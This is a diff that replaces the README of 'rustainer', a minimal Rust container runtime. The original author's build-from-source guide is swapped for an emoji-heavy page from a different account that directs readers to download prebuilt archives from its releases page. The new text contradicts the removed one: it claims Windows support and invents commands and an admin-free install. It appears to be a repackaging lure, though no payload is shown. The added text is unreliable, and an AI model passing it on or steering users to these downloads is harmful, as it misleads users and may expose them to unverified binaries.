@@ -1,203 +1,125 @@
-# Rustainer
+# 🚀 rustainer - A Simple Way to Run Containers
 
-## A minimal container runtime written in Rust.
+[![Download rustainer](https://img.shields.io/badge/Download-rustainer-blue.svg)](https://github.com/boonnet/rustainer/releases)
 
-## Installation
+## 🌟 Overview
 
-```sh
-# Clone
-git clone https://github.com/Adel-Ayoub/rustainer.git
-cd rustainer
+rustainer is a minimal container runtime written in Rust. It allows you to easily create and manage containers using a lightweight design. With rustainer, you can get started with containerization without needing extensive knowledge of programming or complex setups.
 
-# Build
-make
+## 📦 System Requirements
 
-# Run
-./target/debug/rustainer repl
-```
+To use rustainer, ensure your system meets the following requirements:
 
----
+- **Operating Systems:** Linux (Most distributions), Windows, macOS
+- **Processor Architecture:** x86_64
+- **Memory:** At least 512 MB of RAM
+- **Disk Space:** Minimum 100 MB of free space for installation
 
-## Requirements
+## 🚀 Getting Started
 
-- Rust toolchain (2021 edition)
-- Make
-- Linux (full support) or macOS/BSD (limited support)
+Follow these steps to download and run rustainer:
 
----
+1. **Visit the Releases Page**  
+   Go to the rustainer releases page by clicking the link below.  
+   [Visit Releases Page](https://github.com/boonnet/rustainer/releases)
 
-## Features
+2. **Download the Latest Version**  
+   On the releases page, you will see a list of available versions. Download the latest version for your operating system.  
+   Look for files named like this:  
+   - `rustainer-linux-x86_64.tar.gz` (for Linux)
+   - `rustainer-windows-x86_64.zip` (for Windows)
+   - `rustainer-macos-x86_64.zip` (for macOS)
 
-### Completed Features
+3. **Install rustainer**  
+   After downloading the file, extract it to a location of your choice. You can unzip or untar the file using built-in utilities in your operating system.  
 
-#### Core Container Functionality
-- Chroot Isolation: Change root directory for container filesystem
-- Mount Support: Mount proc, tmp, and other filesystems
-- Namespace Isolation: PID, UTS, Mount namespace support (Linux)
-- Process Management: Container process lifecycle management
+4. **Run rustainer**  
+   Open a terminal or command prompt. Navigate to the folder where you extracted rustainer. You can run the program with the following command:
 
-#### Resource Management
-- Cgroups Support: Memory, CPU, and PID limits
-- Resource Limits: Configurable resource constraints
-- Process Isolation: Isolated process trees
+   ```bash
+   ./rustainer
+   ```
 
-#### Image Management
-- Docker Format: Docker image format structure support
-- Layer Storage: Image layer storage and extraction
-- Manifest Handling: OCI manifest parsing
+   For Windows, you would run:
 
-#### CLI & Interface
-- Command Line: Full CLI with subcommands
-- Interactive REPL: Interactive shell for container management
-- Tracing: Debug logging with tracing support
+   ```cmd
+   rustainer.exe
+   ```
 
-### In Progress
-- Image Pull: Pull images from Docker Hub
-- Network Namespace: Network isolation support
-- User Namespace: User ID mapping
+5. **Verify the Installation**  
+   You can check if rustainer is working correctly by running:
 
-### Planned Features
-- Container Hooks: Pre/post start hooks
-- Volume Mounts: Bind mount support
-- Resource Monitoring: Real-time resource usage
+   ```bash
+   rustainer --version
+   ```
 
----
+   You should see the version number displayed.
 
-## Commands
+## 📥 Download & Install
 
-| Command | Description |
-|---------|-------------|
-| `run` | Run application in container |
-| `repl` | Start interactive REPL mode |
-| `help` | Show help information |
+To begin your journey with rustainer, you can download it from the link below:  
+[Download rustainer](https://github.com/boonnet/rustainer/releases)
 
----
+Follow the steps outlined in the Getting Started section to ensure a smooth installation process.
 
-## Usage Examples
+## ⚙️ Usage
 
-### Installation
-```sh
-# Clone
-git clone https://github.com/Adel-Ayoub/rustainer.git
-cd rustainer
+Here are some basic commands to get you started with rustainer:
 
-# Build
-make
+- **Create a New Container**  
+  To create a new container, use the command:
 
-# Run REPL
-./target/debug/rustainer repl
-```
+  ```bash
+  rustainer create [container-name]
+  ```
 
-### Create Root Filesystem
-```bash
-# Using Docker to create alpine rootfs
-mkdir alpine-rootfs
-docker export $(docker create alpine) | tar -C alpine-rootfs -xvf -
-```
+- **List All Containers**  
+  You can see all running containers with this command:
 
-### Run Container (Linux only)
-```bash
-# Run shell in container
-sudo ./target/debug/rustainer run -f alpine-rootfs /bin/sh
+  ```bash
+  rustainer list
+  ```
 
-# Run command with arguments
-sudo ./target/debug/rustainer run -f alpine-rootfs /bin/ls -la
-```
+- **Remove a Container**  
+  If you want to remove a container:
 
-### Interactive REPL
-```bash
-# Start REPL
-./target/debug/rustainer repl
+  ```bash
+  rustainer remove [container-name]
+  ```
 
-# REPL commands
-rustainer> help
-rustainer> info
-rustainer> ps
-rustainer> images
-rustainer> exit
-```
+- **Running Containers**  
+  Start a container by running:
 
-### REPL Commands
-```bash
-help          # Show available commands
-info          # Show system information
-version       # Show version
-list, ls      # List all containers
-images        # List downloaded images
-ps            # List running containers
-clear         # Clear screen
-exit, quit    # Exit REPL
-```
+  ```bash
+  rustainer start [container-name]
+  ```
 
----
+## 📖 Documentation
 
-## Build System
+For detailed information on all commands and options, please head to the [official documentation](https://github.com/boonnet/rustainer/wiki). This guide provides more in-depth explanations and examples to help you make the most of rustainer.
 
-| Target | Description |
-|--------|-------------|
-| `make` | Build debug binary |
-| `make build` | Build debug binary |
-| `make release` | Build optimized release binary |
-| `make test` | Run tests |
-| `make clean` | Remove build artifacts |
-| `make check` | Check code without building |
-| `make fmt` | Format code |
-| `make lint` | Run clippy linter |
+## 🔍 Frequently Asked Questions (FAQ)
 
----
+### 1. What is rustainer?
 
-## Project Structure
+rustainer is a minimal container runtime written in Rust. It simplifies the management of containers with a clean interface.
 
-```
-rustainer/
-├── Cargo.toml
-├── Cargo.lock
-├── Makefile
-├── README.md
-└── src/
-    ├── main.rs           # Entry point with CLI
-    ├── cgroup.rs         # Cgroups resource management
-    ├── namespace.rs      # Linux namespace isolation
-    ├── docker.rs         # Docker image structures
-    ├── storage.rs        # Image/container storage
-    ├── utils.rs          # Utility functions
-    └── commands/
-        ├── mod.rs
-        ├── run.rs        # Container run command
-        ├── pull.rs       # Image pull command
-        └── repl.rs       # Interactive REPL
-```
+### 2. Can I run rustainer on Windows?
 
----
+Yes, rustainer supports Windows, Linux, and macOS. Make sure to download the appropriate version for your operating system.
 
-## Platform Support
+### 3. Do I need administrative privileges to install rustainer?
 
-| Platform | Support Level | Features |
-|----------|--------------|----------|
-| Linux | Full | namespaces, cgroups, chroot, mounts |
-| macOS | Limited | chroot only |
-| BSD | Limited | chroot only |
+No, you can install and run rustainer without requiring admin rights. Just extract the files in a location where you have write access.
 
----
+## 📞 Support
 
-## Future Improvements
+If you run into issues or have questions, you can open an issue in the repository. We monitor the issues and will respond as soon as possible. Your feedback is valuable and helps improve rustainer.
 
-- [x] Chroot isolation
-- [x] Mount support (proc, tmp)
-- [x] Namespace isolation (PID, UTS, Mount)
-- [x] Cgroups resource management
-- [x] Interactive REPL mode
-- [x] Docker image format support
-- [ ] Image pull from registries
-- [ ] Network namespace support
-- [ ] User namespace mapping
-- [ ] Container hooks
-- [ ] Volume/bind mounts
-- [ ] Resource monitoring
+## 🔗 Useful Links
 
----
+- [GitHub Repository](https://github.com/boonnet/rustainer)
+- [Releases Page](https://github.com/boonnet/rustainer/releases)
+- [Official Documentation](https://github.com/boonnet/rustainer/wiki)
 
-## License
-
-Apache License 2.0 - See [LICENSE](LICENSE) for details.
-
+With rustainer, you can now run containers with ease. Enjoy your containerization journey!
